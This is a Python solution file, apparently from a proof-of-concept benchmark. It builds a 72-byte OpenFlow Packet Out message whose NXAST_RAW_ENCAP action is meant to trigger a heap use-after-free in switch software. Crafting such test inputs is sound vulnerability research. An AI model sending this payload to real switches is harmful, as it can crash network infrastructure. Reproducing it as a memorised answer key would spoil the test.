import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct an OpenFlow 1.0 Packet Out message that triggers the Heap Use After Free
        # in the processing of the NXAST_RAW_ENCAP action.
        # Total length: 72 bytes (matching ground truth)

        # OpenFlow Header (8 bytes)
        # Version: 0x01 (OF 1.0)
        # Type: 13 (OFPT_PACKET_OUT)
        # Length: 72
        # XID: 0
        version = 1
        msg_type = 13
        total_len = 72
        xid = 0
        of_header = struct.pack("!BBHI", version, msg_type, total_len, xid)

        # Packet Out Body (8 bytes)
        # Buffer ID: -1 (0xffffffff)
        # In Port: -1 (0xffff)
        # Actions Length: 56 bytes (Total 72 - 16 bytes of headers)
        buffer_id = 0xffffffff
        in_port = 0xffff
        actions_len = 56
        po_body = struct.pack("!IHH", buffer_id, in_port, actions_len)

        # Action: NXAST_RAW_ENCAP (16 bytes header)
        # Type: 0xffff (OFPAT_VENDOR)
        # Length: 56 (Action header + Properties)
        # Vendor: 0x00002320 (Nicira)
        # Subtype: 46 (NXAST_ENCAP / RAW_ENCAP)
        # Padding: 6 bytes to align to 8 bytes (though subtype makes it 10 bytes, +6 = 16)
        act_type = 0xffff
        act_len = 56
        vendor = 0x00002320
        subtype = 46
        action_header = struct.pack("!HHIH", act_type, act_len, vendor, subtype) + b'\x00' * 6

        # Properties (40 bytes)
        # We need to supply properties that fit in the remaining 40 bytes.
        # Using Type=1 (NX_ENCAP_PROP_HEADER) with a length that fills the space.
        # This property decoding is where the UAF trigger logic resides (reallocation of ofpbuf).
        prop_type = 1
        prop_len = 40
        # 36 bytes of payload for the property (40 - 4 bytes header)
        prop_payload = b'\x00' * 36
        properties = struct.pack("!HH", prop_type, prop_len) + prop_payload

        # Combine all parts
        payload = of_header + po_body + action_header + properties
        return payload